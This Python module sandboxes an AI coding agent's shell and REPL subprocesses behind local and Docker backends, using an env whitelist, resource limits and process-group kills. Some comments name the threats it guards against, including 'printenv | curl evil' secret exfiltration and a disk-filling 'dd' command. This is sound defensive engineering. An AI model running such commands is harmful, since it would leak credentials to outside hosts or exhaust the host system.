"""Sandbox ``Environment`` seam over the coding tools' subprocess spawns.

The three code-execution tools (:mod:`.shell` foreground, :mod:`.shell_tasks`
background registry, :mod:`.repl` persistent interpreter) each spawn a child
process with the same confinement: workspace cwd, a stripped env whitelist,
and POSIX resource limits + ``setsid`` applied in a ``preexec_fn``. This
module funnels those three spawn sites through a single
:class:`Environment` abstraction so a non-local backend (a container, a VM)
can be dropped in via one env var without touching the tool dispatchers.

* :class:`LocalEnvironment` is the default — it reproduces the historical
  ``asyncio.create_subprocess_*`` calls byte-for-byte, so existing behavior
  (and every existing test) is unchanged.
* :class:`DockerEnvironment` runs each spawned process in its own
  short-lived ``docker run --rm`` container. The container name is the
  kill token: ``docker kill <name>`` is native and exact, whereas a host
  ``killpg`` cannot reach in-container PIDs. One container per spawned
  process ("container == unit of kill") — NOT a long-lived container with
  ``docker exec``, whose PID tracking is fragile.
* :func:`get_environment` selects the backend from
  ``CORLINMAN_SANDBOX_BACKEND`` (default ``local``), read live per call.

## Handles

A spawn returns a :class:`SpawnedProcess` handle, not a bare process, so the
termination logic (SIGKILL the whole process group + sweep daemonized
survivors) travels WITH the spawned child rather than living on the
environment: a persistent :mod:`.repl` session outlives the call that
spawned it, so its kill must not depend on re-resolving a backend later.
``handle.proc`` exposes the underlying asyncio subprocess so the existing
``readline`` / ``communicate`` / stdin-drain code needs no change.

## Security caveat

This is NOT a security boundary — see the :mod:`.shell` module docstring.
The env whitelist + rlimits bound the blast radius of an *accident*; the
real isolation lives in the deployment. The :class:`DockerEnvironment`
backend narrows that gap, but the local default remains "a real shell as
the agent user".

The docker backend's workspace bind-mount is **read-write by design** —
the agent must be able to build/edit files in its workspace. The sandbox
protects the HOST *outside* the workspace and the gateway's process env
secrets (never forwarded into the container); it does NOT protect the
workspace itself. Container networking stays ENABLED for parity with the
local shell (builds fetch deps), and the :data:`~.shell._DENY` screen
still runs pre-spawn regardless of backend.

Unless :data:`ENV_SANDBOX_USER` is set, the container runs as the image's
default user (root for the stock python image). On a Linux host that means
files the agent writes into the bind-mounted workspace come out root-owned
and can ``EACCES`` host-side tooling (write_file/edit/git). Set the knob to
``uid:gid`` (e.g. ``1000:1000``) to remap; it is not the default because an
arbitrary uid breaks images that expect a writable ``$HOME`` or root-level
package installs, and Docker Desktop (macOS/Windows) remaps ownership
transparently anyway.
"""

from __future__ import annotations

import abc
import asyncio
import os
import shutil
import signal
import subprocess
import sys
import uuid
from collections.abc import Mapping, Sequence
from pathlib import Path
from typing import Any, cast

#: POSIX resource limits applied to every spawned child. Tuned for a
#: build/test workload (running ``pytest``, ``npm``, ``cargo`` etc.)
#: while still bounding the blast radius of a runaway command.
#:
#: * ``RLIMIT_CPU=60`` — 60 CPU-seconds. The kernel delivers SIGXCPU
#:   when the soft limit is reached; the SIGKILL at the hard limit
#:   guarantees termination.
#: * ``RLIMIT_AS`` — 2 GiB virtual address space cap. Caught by any
#:   later malloc, so the process fails fast instead of OOMing the host.
#:   Disabled on macOS where it interacts poorly with dyld.
#: * ``RLIMIT_FSIZE`` — 100 MiB per-file write cap. A ``dd if=/dev/zero``
#:   gets ``EFBIG`` rather than filling the disk.
#: * ``RLIMIT_NPROC=64`` — guards against fork-bomb-style amplification
#:   from inside the spawned shell.
#: * ``RLIMIT_NOFILE=256`` — generous enough for normal builds, low
#:   enough to bound an fd-exhaustion attack.
_RLIMIT_CPU_SECS = 60
_RLIMIT_AS_BYTES = 2 * 1024 * 1024 * 1024  # 2 GiB
_RLIMIT_FSIZE_BYTES = 100 * 1024 * 1024  # 100 MiB
_RLIMIT_NPROC = 64
_RLIMIT_NOFILE = 256

#: Whitelist of env vars forwarded to the shell child. The gateway's
#: process environment carries provider API keys, gRPC credentials, and
#: hook secrets — those MUST NOT be visible to a model-driven shell.
#: Only the variables a sane build needs are passed through. Add to
#: this list with care.
_ENV_WHITELIST = ("PATH", "LANG", "LC_ALL", "HOME", "USER", "LOGNAME", "TZ")


def _build_child_env() -> dict[str, str]:
    """Return the env passed to the spawned shell.

    Walks the parent process env and keeps only the
    :data:`_ENV_WHITELIST` keys. This is the single chokepoint where
    provider API keys, OAuth tokens, and other secrets are stripped so
    the model-driven shell cannot ``echo $OPENAI_API_KEY`` or
    ``printenv | curl evil``.
    """
    parent = os.environ
    env: dict[str, str] = {}
    for key in _ENV_WHITELIST:
        if key in parent:
            env[key] = parent[key]
    # Bare minimum a shell needs to find binaries; if PATH is missing
    # the model gets a clear error instead of a silent ``command not
    # found`` in a weird state.
    if "PATH" not in env:
        env["PATH"] = "/usr/local/bin:/usr/bin:/bin"
    return env


def _preexec_apply_rlimits() -> None:
    """``preexec_fn`` callable: applies :data:`_RLIMIT_*` then ``setsid``.

    Runs in the forked child between ``fork()`` and ``exec()``. ``resource``
    is POSIX-only — Windows callers skip this hook (we gate on
    :data:`sys.platform` at the call site).

    Each rlimit is applied independently and best-effort: kernels differ
    in which limits they implement (macOS's ``RLIMIT_AS`` interacts
    poorly with dyld; some BSDs lack ``RLIMIT_NPROC``), and the hard
    limit inherited from the parent may already be lower than the
    ceiling we'd like to set. Failures on one limit MUST NOT block the
    spawn — the remaining limits still bound the blast radius.

    ``setsid`` gives the child its own process-group so a timeout can
    ``killpg`` the whole tree (the shell + every command it forked).
    Without this, ``proc.kill()`` only kills the shell wrapper and the
    real workload survives.
    """
    import resource

    def _apply(name: str, soft: int, hard: int) -> None:
        """Best-effort ``setrlimit``: clamp against the current hard
        limit, swallow per-kernel quirks. Order matters: the CPU limit
        runs first so a misbehaving caller still gets bounded
        wall-clock + CPU time.
        """
        rlim_id = getattr(resource, name, None)
        if rlim_id is None:
            return
        try:
            _cur_soft, cur_hard = cast(Any, resource).getrlimit(rlim_id)
            # Cannot raise hard limit without privilege; respect it.
            new_hard = (
                min(hard, cur_hard)
                if cur_hard != cast(Any, resource).RLIM_INFINITY
                else hard
            )
            new_soft = min(soft, new_hard)
            cast(Any, resource).setrlimit(rlim_id, (new_soft, new_hard))
        except (ValueError, OSError):  # type: ignore[attr-defined]
            # Kernel refused or limit unsupported — every other limit
            # still applies. Swallow rather than blow the spawn.
            pass

    _apply("RLIMIT_CPU", _RLIMIT_CPU_SECS, _RLIMIT_CPU_SECS)
    _apply("RLIMIT_FSIZE", _RLIMIT_FSIZE_BYTES, _RLIMIT_FSIZE_BYTES)
    # RLIMIT_AS is hostile to macOS dyld; skipped on Darwin. Linux is
    # fine, and that's where the most realistic deployments live.
    if sys.platform != "darwin":
        _apply("RLIMIT_AS", _RLIMIT_AS_BYTES, _RLIMIT_AS_BYTES)
    _apply("RLIMIT_NPROC", _RLIMIT_NPROC, _RLIMIT_NPROC)
    _apply("RLIMIT_NOFILE", _RLIMIT_NOFILE, _RLIMIT_NOFILE)
    # New session — so killpg(getpgid(pid)) reaps the whole process tree.
    cast(Any, os).setsid()


def kill_process_group(proc: asyncio.subprocess.Process) -> None:
    """Kill the spawned shell AND every command it forked.

    ``proc.kill()`` only delivers SIGKILL to the immediate child (the
    shell wrapper). If the shell ran ``sleep 9999 &`` or even ``sleep
    9999`` synchronously, the sleep survives the wrapper's death unless
    we signal the whole process group. ``setsid`` in the preexec_fn makes
    the child its own session leader, so ``killpg(getpgid(pid),
    SIGKILL)`` reaps the whole tree.

    Shared by the foreground timeout path (:func:`dispatch_run_shell`)
    and the background task registry (:mod:`.shell_tasks`).
    """
    if sys.platform == "win32":
        try:
            proc.kill()
        except ProcessLookupError:
            pass
        return
    try:
        pgid = os.getpgid(proc.pid)
        os.killpg(pgid, signal.SIGKILL)
    except (ProcessLookupError, PermissionError):
        # Already gone, or — for tests where preexec_fn was bypassed —
        # the child isn't a session leader. Fall back to single-process kill.
        try:
            proc.kill()
        except ProcessLookupError:
            pass


def reap_orphan_group(proc: asyncio.subprocess.Process) -> None:
    """SIGKILL anything still in ``proc``'s group AFTER the leader exited.

    A command that daemonizes its real work — ``sleep 600 >/dev/null 2>&1
    &`` — lets the shell leader exit 0 while a child lives on in the same
    process group. By the time a background task's pump sees the pipe EOF,
    asyncio's child watcher has already reaped the leader zombie, so
    ``os.getpgid(proc.pid)`` (what :func:`kill_process_group` calls first)
    raises ``ProcessLookupError`` and can't find the group. Under
    ``setsid`` the group id equals the leader's original pid, so we
    ``killpg(proc.pid, SIGKILL)`` DIRECTLY to reap the survivors — the
    pgid stays reserved (not recycled) while the group has members, so
    this targets exactly that group. Best-effort: an already-empty group
    (the common, no-daemon case) raises ``ProcessLookupError`` and is
    swallowed. Keeps daemonized children inside the task lifecycle
    (watchdog / kill controls) instead of escaping as true orphans.
    """
    if sys.platform == "win32":
        return
    try:
        os.killpg(proc.pid, signal.SIGKILL)
    except (ProcessLookupError, PermissionError):
        pass


class SpawnedProcess(abc.ABC):
    """Handle for a sandboxed child process.

    ``.proc`` exposes the asyncio subprocess so existing readline /
    communicate / stdin-drain code stays unchanged. The termination
    methods travel with the handle rather than the environment because a
    persistent REPL session outlives the call that spawned it.
    """

    proc: asyncio.subprocess.Process

    @abc.abstractmethod
    def kill(self) -> None:
        """SIGKILL the whole process tree. Never raises."""

    @abc.abstractmethod
    def reap(self) -> None:
        """Reap the whole process group — the leader plus any daemonized
        survivor that outlived it. Mirrors the ``kill_process_group`` +
        ``reap_orphan_group`` pair; idempotent and never raises."""


class LocalSpawnedProcess(SpawnedProcess):
    """A :class:`SpawnedProcess` backed by a plain local child process."""

    def __init__(self, proc: asyncio.subprocess.Process) -> None:
        self.proc = proc

    def kill(self) -> None:
        kill_process_group(self.proc)

    def reap(self) -> None:
        kill_process_group(self.proc)
        reap_orphan_group(self.proc)


# ---------------------------------------------------------------------------
# Docker backend
# ---------------------------------------------------------------------------

#: Sandbox image knob, read live per spawn so an operator (or a test) can
#: point at a different base image without a restart. The interpreter for
#: :meth:`DockerEnvironment.spawn_repl` lives INSIDE this image, so
#: ``CORLINMAN_PYTHON`` is intentionally ignored on the docker backend.
ENV_SANDBOX_IMAGE = "CORLINMAN_SANDBOX_IMAGE"
_DEFAULT_SANDBOX_IMAGE = "python:3.12-slim-bookworm"

#: Optional ``docker run --user`` value (``uid``, ``uid:gid``, or a named
#: user the image knows), read live per spawn. Unset (the default) keeps the
#: image's own default user — root for the stock python image — because an
#: arbitrary uid breaks images expecting a writable ``$HOME`` or root-level
#: installs. Set it (typically ``$(id -u):$(id -g)``) on Linux hosts where
#: root-owned files in the bind-mounted workspace would trip host tooling.
ENV_SANDBOX_USER = "CORLINMAN_SANDBOX_USER"

#: The ONLY host env vars forwarded into the container. PATH/HOME/USER/
#: LOGNAME are deliberately NOT forwarded — the container image owns those
#: (the host's values are meaningless, or worse, misleading, inside it).
_DOCKER_ENV_FORWARD = ("LANG", "LC_ALL", "TZ")


class SandboxSpawnError(OSError):
    """A docker-backed spawn failed (run failure, or the ``docker`` binary
    vanished mid-spawn).

    Subclasses :class:`OSError` **on purpose**: the three spawn sites
    (:func:`~.shell.dispatch_run_shell`, :mod:`.shell_tasks`, :mod:`.repl`)
    already fold ``OSError`` into their ``spawn_failed`` envelopes, so a
    docker failure reuses those never-raise paths with zero changes at the
    call sites.
    """


class DaemonUnavailableError(SandboxSpawnError):
    """The ``docker`` binary is not on ``PATH`` (or disappeared between the
    pre-flight check and ``exec``). Carries an actionable message telling
    the operator to install Docker or drop back to the local backend."""


def _container_name() -> str:
    """A fresh container name — the token :meth:`DockerSpawnedProcess.kill`
    passes to ``docker kill``. Uniqueness per spawn is what makes the kill
    exact."""
    return "corlinman-sbx-" + uuid.uuid4().hex


def _docker_kill(name: str) -> None:
    """``docker kill <name>``; swallow every error, never raise.

    Runs synchronously so it is callable from non-async / ``atexit``
    contexts (mirrors :func:`kill_process_group`). A ``--rm`` container
    self-removes once killed, so there is no separate ``docker rm`` step.
    Failures (daemon down, container already gone, binary missing) are all
    benign here — the goal state (container not running) already holds.
    """
    try:
        subprocess.run(
            ["docker", "kill", name],
            capture_output=True,
            timeout=10,
            check=False,
        )
    except (OSError, subprocess.SubprocessError):
        pass


class DockerSpawnedProcess(SpawnedProcess):
    """A :class:`SpawnedProcess` whose real work runs in a ``docker run``
    container. ``.proc`` is the local ``docker run`` CLIENT process; the
    container (named ``self._container``) is the actual unit of kill."""

    def __init__(
        self, proc: asyncio.subprocess.Process, container_name: str
    ) -> None:
        self.proc = proc
        self._container = container_name

    def kill(self) -> None:
        _docker_kill(self._container)
        # Post-setsid the client is its own group leader: this reaps exactly
        # the client tree, unblocking the dispatcher's await proc.wait() even
        # when the daemon is hung (the container may leak in that edge — a
        # hung daemon cannot be asked to remove it — but the dispatcher must
        # not hang with it).
        kill_process_group(self.proc)

    def reap(self) -> None:
        _docker_kill(self._container)
        kill_process_group(self.proc)
        reap_orphan_group(self.proc)


def _docker_run_argv(
    *,
    name: str,
    workspace: Path,
    image: str,
    exec_argv: Sequence[str],
    interactive: bool,
    env: Mapping[str, str],
    user: str | None = None,
) -> list[str]:
    """Compose the full ``docker run`` argv (argv[0] == ``docker``).

    Pure — no docker/daemon contact — so the isolation knobs are pinned by
    unit tests. ``exec_argv`` is the in-container command
    (``["/bin/sh", "-c", command]`` for a shell, the interpreter argv for a
    REPL). ``interactive`` adds ``-i`` (only when a stdin pipe is wanted).
    Only :data:`_DOCKER_ENV_FORWARD` keys present in ``env`` are forwarded.
    ``user`` (from :data:`ENV_SANDBOX_USER`) adds ``--user`` when set.
    """
    abs_ws = os.path.abspath(os.fspath(workspace))
    argv = [
        "docker",
        "run",
        "--rm",
        "--name",
        name,
        "-v",
        f"{abs_ws}:/workspace",
        "-w",
        "/workspace",
        "--security-opt=no-new-privileges",
        "--pids-limit=64",
        "--memory=2g",
        "--memory-swap=2g",
        "--ulimit",
        "nofile=256:256",
        "--ulimit",
        "cpu=60:60",
        "--ulimit",
        "fsize=104857600:104857600",
    ]
    if user:
        argv += ["--user", user]
    for key in _DOCKER_ENV_FORWARD:
        val = env.get(key)
        if val is not None:
            argv += ["-e", f"{key}={val}"]
    if interactive:
        argv.append("-i")
    argv.append(image)
    argv.extend(exec_argv)
    return argv


class Environment(abc.ABC):
    """A backend that spawns confined child processes for the coding tools."""

    @abc.abstractmethod
    async def spawn_shell(
        self, command: str, *, workspace: Path, stdin: int | None = None
    ) -> SpawnedProcess:
        """Spawn ``command`` under a shell in ``workspace``. Combined
        stdout+stderr is a pipe. ``stdin`` follows ``create_subprocess_*``
        semantics — ``None`` inherits the parent's stdin (unchanged from
        the historical foreground shell)."""

    @abc.abstractmethod
    async def spawn_repl(self, *, workspace: Path) -> SpawnedProcess:
        """Spawn the persistent ``python -u -i -q`` interpreter used by
        :mod:`.repl`, with a piped stdin/stdout in ``workspace``."""


class LocalEnvironment(Environment):
    """Default backend — spawns children directly on the host.

    Reproduces the historical ``asyncio.create_subprocess_*`` calls
    byte-for-byte (workspace cwd, env whitelist, POSIX rlimits + setsid),
    so existing behavior is unchanged. Stateless — constructed fresh per
    :func:`get_environment` call.
    """

    async def spawn_shell(
        self, command: str, *, workspace: Path, stdin: int | None = None
    ) -> SpawnedProcess:
        spawn_kwargs: dict[str, Any] = {
            "cwd": str(workspace),
            "stdout": asyncio.subprocess.PIPE,
            "stderr": asyncio.subprocess.STDOUT,
            "env": _build_child_env(),
        }
        # The historical foreground shell does NOT set stdin (it inherits);
        # only pass it through when a caller explicitly supplies one.
        if stdin is not None:
            spawn_kwargs["stdin"] = stdin
        # POSIX-only: apply rlimits + setsid before exec. Skipped on Windows
        # (CPython's ``preexec_fn`` is POSIX-only).
        if sys.platform != "win32":
            spawn_kwargs["preexec_fn"] = _preexec_apply_rlimits
        proc = await asyncio.create_subprocess_shell(command, **spawn_kwargs)
        return LocalSpawnedProcess(proc)

    async def spawn_repl(self, *, workspace: Path) -> SpawnedProcess:
        # Interpreter resolution stays live per spawn: an operator override
        # (or a test) takes effect on the next respawn without a restart.
        python_executable = (
            os.environ.get("CORLINMAN_PYTHON") or sys.executable or "python3"
        )
        spawn_kwargs: dict[str, Any] = {
            "cwd": str(workspace),
            "stdin": asyncio.subprocess.PIPE,
            "stdout": asyncio.subprocess.PIPE,
            "stderr": asyncio.subprocess.STDOUT,
            "env": _build_child_env(),
        }
        if sys.platform != "win32":
            spawn_kwargs["preexec_fn"] = _preexec_apply_rlimits
        # ``-i`` keeps the interpreter alive reading from the pipe; ``-q``
        # suppresses the banner; ``-u`` keeps stdout unbuffered.
        proc = await asyncio.create_subprocess_exec(
            python_executable,
            "-u",
            "-i",
            "-q",
            **spawn_kwargs,
        )
        return LocalSpawnedProcess(proc)


class DockerEnvironment(Environment):
    """Container-backed environment — one ``docker run --rm`` container per
    spawned process, killed by container name.

    Stateless (constructed fresh per :func:`get_environment` call); every
    knob (:data:`ENV_SANDBOX_IMAGE`) is read live per spawn.
    """

    def _require_docker(self) -> None:
        """Fail loudly with an actionable message when the daemon client is
        absent — better than a silent local fallback for a misconfigured
        ``CORLINMAN_SANDBOX_BACKEND=docker`` deployment."""
        if shutil.which("docker") is None:
            raise DaemonUnavailableError(
                "docker binary not found on PATH; install Docker or unset "
                f"{ENV_SANDBOX_BACKEND}"
            )

    async def spawn_shell(
        self, command: str, *, workspace: Path, stdin: int | None = None
    ) -> SpawnedProcess:
        self._require_docker()
        name = _container_name()
        image = os.environ.get(ENV_SANDBOX_IMAGE) or _DEFAULT_SANDBOX_IMAGE
        argv = _docker_run_argv(
            name=name,
            workspace=workspace,
            image=image,
            exec_argv=["/bin/sh", "-c", command],
            # ``-i`` only when a caller wired a stdin pipe; the historical
            # foreground shell leaves stdin inheriting (stdin is None).
            interactive=stdin is not None,
            env=os.environ,
            user=os.environ.get(ENV_SANDBOX_USER) or None,
        )
        spawn_kwargs: dict[str, Any] = {
            "stdout": asyncio.subprocess.PIPE,
            "stderr": asyncio.subprocess.STDOUT,
        }
        if stdin is not None:
            spawn_kwargs["stdin"] = stdin
        # The docker CLIENT gets its own session so any legacy killpg path
        # (shell_tasks' terminal reap) can only ever reach the client's own
        # group, never the SERVER's — without setsid the un-forked client
        # shares the server's pgid and a group kill would nuke the host.
        # Deliberately NOT _preexec_apply_rlimits: rlimits here would bind the
        # docker CLI on the host, while the --ulimit flags own the in-container
        # limits.
        if sys.platform != "win32":
            spawn_kwargs["preexec_fn"] = cast(Any, os).setsid
        try:
            proc = await asyncio.create_subprocess_exec(*argv, **spawn_kwargs)
        except FileNotFoundError as exc:
            # Race: ``docker`` vanished between _require_docker and exec.
            raise DaemonUnavailableError(
                f"docker binary not found on PATH: {exc}"
            ) from exc
        except OSError as exc:
            raise SandboxSpawnError(f"docker run failed: {exc}") from exc
        return DockerSpawnedProcess(proc, name)

    async def spawn_repl(self, *, workspace: Path) -> SpawnedProcess:
        self._require_docker()
        name = _container_name()
        image = os.environ.get(ENV_SANDBOX_IMAGE) or _DEFAULT_SANDBOX_IMAGE
        # The interpreter lives in the image — ``CORLINMAN_PYTHON`` (which the
        # local backend honours) is intentionally ignored here. ``-i`` keeps
        # it reading the stdin pipe; ``-q`` drops the banner; ``-u`` keeps
        # stdout unbuffered. NEVER ``-t`` — a tty would corrupt the marker /
        # prompt framing the :mod:`.repl` readline loop depends on.
        argv = _docker_run_argv(
            name=name,
            workspace=workspace,
            image=image,
            exec_argv=["python3", "-u", "-i", "-q"],
            interactive=True,
            env=os.environ,
            user=os.environ.get(ENV_SANDBOX_USER) or None,
        )
        spawn_kwargs: dict[str, Any] = {
            "stdin": asyncio.subprocess.PIPE,
            "stdout": asyncio.subprocess.PIPE,
            "stderr": asyncio.subprocess.STDOUT,
        }
        # Same rationale as spawn_shell: the docker CLIENT gets its own session
        # so a legacy killpg can only reach the client's group, never the
        # server's. NOT _preexec_apply_rlimits — the --ulimit flags own the
        # in-container limits; rlimits here would bind the host docker CLI.
        if sys.platform != "win32":
            spawn_kwargs["preexec_fn"] = cast(Any, os).setsid
        try:
            proc = await asyncio.create_subprocess_exec(*argv, **spawn_kwargs)
        except FileNotFoundError as exc:
            raise DaemonUnavailableError(
                f"docker binary not found on PATH: {exc}"
            ) from exc
        except OSError as exc:
            raise SandboxSpawnError(f"docker run failed: {exc}") from exc
        return DockerSpawnedProcess(proc, name)


# Env var contract — keep this name stable; ops/runbooks reference it.
ENV_SANDBOX_BACKEND = "CORLINMAN_SANDBOX_BACKEND"


def get_environment(env: dict[str, str] | None = None) -> Environment:
    """Pick a sandbox backend based on ``CORLINMAN_SANDBOX_BACKEND``.

    Defaults to :class:`LocalEnvironment` so existing deployments need no
    env-var change. ``env`` is injectable for tests; production callers
    pass ``None`` (reads ``os.environ``). The var is read LIVE on every
    call — nothing is cached — so a per-call override takes effect
    immediately. Backends are stateless, so returning a fresh instance is
    cheap.

    The ``docker`` backend runs each spawned process in its own short-lived
    ``docker run --rm`` container, killed by container name (see
    :class:`DockerEnvironment`). A misconfigured ``docker`` deployment fails
    loudly at spawn — :meth:`DockerEnvironment._require_docker` raises
    :class:`DaemonUnavailableError` when the client binary is absent — rather
    than silently falling back to running on the host.
    """
    e = env if env is not None else os.environ
    kind = (e.get(ENV_SANDBOX_BACKEND) or "local").strip().lower()
    if kind in ("", "local"):
        return LocalEnvironment()
    if kind == "docker":
        return DockerEnvironment()
    raise RuntimeError(
        f"unknown {ENV_SANDBOX_BACKEND}={kind!r}; expected one of: local, docker"
    )


__all__ = [
    "ENV_SANDBOX_BACKEND",
    "ENV_SANDBOX_IMAGE",
    "ENV_SANDBOX_USER",
    "DaemonUnavailableError",
    "DockerEnvironment",
    "DockerSpawnedProcess",
    "Environment",
    "LocalEnvironment",
    "LocalSpawnedProcess",
    "SandboxSpawnError",
    "SpawnedProcess",
    "get_environment",
    "kill_process_group",
    "reap_orphan_group",
]
